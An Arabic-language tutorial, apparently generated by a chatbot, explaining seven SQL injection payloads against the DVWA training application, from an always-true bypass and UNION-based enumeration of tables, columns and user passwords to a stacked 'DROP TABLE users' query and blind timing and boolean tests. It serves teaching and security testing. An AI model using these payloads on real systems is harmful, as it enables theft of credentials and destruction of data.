في تطبيق DVWA (Damn Vulnerable Web Application)، يُستخدم لتعليم واختبار تقنيات استغلال ثغرات الويب، خاصةً هجمات SQL Injection. يتضمن التطبيق مستويات أمان مختلفة (من منخفض إلى عالٍ) لتوفير بيئة تدريبية متنوعة.([Pentest Journeys][1])

فيما يلي شرح شامل لأهم الحمولات (Payloads) المستخدمة في استغلال ثغرات SQL Injection في DVWA، مع توضيح كيفية عمل كل منها:

---

## المحور الأول: تجاوز التحقق الأساسي باستخدام شرط دائم الصواب

**الحمولة:**

```sql
1' OR '1'='1' --
```

**الشرح:**
تُستخدم هذه الحمولة لتجاوز التحقق من صحة إدخال المستخدم، حيث يتم إدخال شرط دائم الصواب (`'1'='1'`) في استعلام SQL. عند تنفيذ الاستعلام، يُصبح الشرط دائمًا صحيحًا، مما يؤدي إلى استرجاع جميع السجلات من قاعدة البيانات بدلاً من سجل واحد محدد.([Medium][2])

**مثال على الاستعلام الناتج:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1' --';
```

يؤدي هذا الاستعلام إلى استرجاع جميع المستخدمين من جدول `users`، مما يُظهر ضعف التحقق من إدخال المستخدم.([Medium][3])

---

## المحور الثاني: استخدام UNION لاسترجاع بيانات من جداول أخرى

**الحمولة:**

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables --
```

**الشرح:**
تُستخدم هذه الحمولة لاسترجاع أسماء الجداول الموجودة في قاعدة البيانات. يُستخدم `UNION` لدمج نتائج استعلامين، حيث يتم استرجاع أسماء الجداول من جدول النظام `information_schema.tables`.([Medium][2])

**مثال على الاستعلام الناتج:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT table_name, NULL FROM information_schema.tables --';
```

يُظهر هذا الاستعلام أسماء جميع الجداول في قاعدة البيانات، مما يُمكن المهاجم من فهم بنية قاعدة البيانات.

---

## المحور الثالث: استرجاع أسماء الأعمدة من جدول محدد

**الحمولة:**

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
```

**الشرح:**
بعد معرفة أسماء الجداول، يُمكن استخدام هذه الحمولة لاسترجاع أسماء الأعمدة من جدول محدد (مثل `users`). يُستخدم `information_schema.columns` لاسترجاع معلومات الأعمدة.

**مثال على الاستعلام الناتج:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --';
```

يُظهر هذا الاستعلام أسماء جميع الأعمدة في جدول `users`، مما يُساعد المهاجم في تحديد الأعمدة التي تحتوي على معلومات حساسة.

---

## المحور الرابع: استرجاع بيانات حساسة مثل أسماء المستخدمين وكلمات المرور

**الحمولة:**

```sql
' UNION SELECT user, password FROM users --
```

**الشرح:**
بعد معرفة أسماء الأعمدة، يُمكن استخدام هذه الحمولة لاسترجاع بيانات حساسة مثل أسماء المستخدمين وكلمات المرور. يُستخدم `UNION` لدمج نتائج الاستعلام مع البيانات الحساسة.([Medium][3])

**مثال على الاستعلام الناتج:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT user, password FROM users --';
```

يُظهر هذا الاستعلام أسماء المستخدمين وكلمات المرور المخزنة في جدول `users`.

---

## المحور الخامس: تنفيذ استعلامات متعددة باستخدام Stacked Queries

**الحمولة:**

```sql
1'; DROP TABLE users; --
```

**الشرح:**
تُستخدم هذه الحمولة لتنفيذ استعلامات متعددة في وقت واحد. يُستخدم الفاصل `;` لفصل الاستعلامات، مما يُمكن المهاجم من تنفيذ استعلامات إضافية مثل حذف جدول.

**مثال على الاستعلام الناتج:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'; DROP TABLE users; --';
```

يؤدي هذا الاستعلام إلى حذف جدول `users` من قاعدة البيانات، مما يُسبب فقدان البيانات.

---

## المحور السادس: استخدام Time-Based Blind SQL Injection

**الحمولة:**

```sql
1' AND SLEEP(5) --
```

**الشرح:**
تُستخدم هذه الحمولة لاختبار وجود ثغرات SQL Injection عندما لا تُظهر قاعدة البيانات رسائل خطأ. يُستخدم الدالة `SLEEP(5)` لتأخير الاستجابة لمدة 5 ثوانٍ، مما يُشير إلى وجود ثغرة إذا حدث التأخير.

**مثال على الاستعلام الناتج:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND SLEEP(5) --';
```

إذا تأخرت الاستجابة لمدة 5 ثوانٍ، فهذا يُشير إلى وجود ثغرة SQL Injection.

---

## المحور السابع: استخدام Boolean-Based Blind SQL Injection

**الحمولة:**

```sql
1' AND 1=1 --
1' AND 1=2 --
```

**الشرح:**
تُستخدم هذه الحمولات لاختبار وجود ثغرات SQL Injection عندما لا تُظهر قاعدة البيانات رسائل خطأ. يُستخدم شرط منطقي دائم الصواب (`1=1`) وشرط دائم الخطأ (`1=2`) لملاحظة اختلاف في سلوك التطبيق.

**مثال على الاستعلام الناتج:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=1 --';
SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=2 --';
```

إذا أظهر الاستعلام الأول نتائج ولم يُظهر الثاني، فهذا يُشير إلى وجود ثغرة SQL Injection.

---

من خلال فهم هذه الحمولات وكيفية عملها، يُمكن للمطورين ومختبري الأمان التعرف على نقاط الضعف في تطبيقاتهم واتخاذ الإجراءات اللازمة لتعزيز الأمان.

[1]: https://cspanias.github.io/posts/DVWA-SQL-Injection/?utm_source=chatgpt.com "DVWA - SQL Injection - Pentest Journeys"
[2]: https://medium.com/%40waeloueslati18/exploring-dvwa-a-walkthrough-of-the-sql-injection-challenge-part-7-7ada1ae784f2?utm_source=chatgpt.com "Exploring DVWA : A Walkthrough of The SQL injection Challenge ..."
[3]: https://medium.com/%40aayushtiruwa120/dvwa-sql-injection-91b4efb683e4?utm_source=chatgpt.com "DVWA SQL INJECTION. (low,medium, high) | by Aayush Tiruwa"

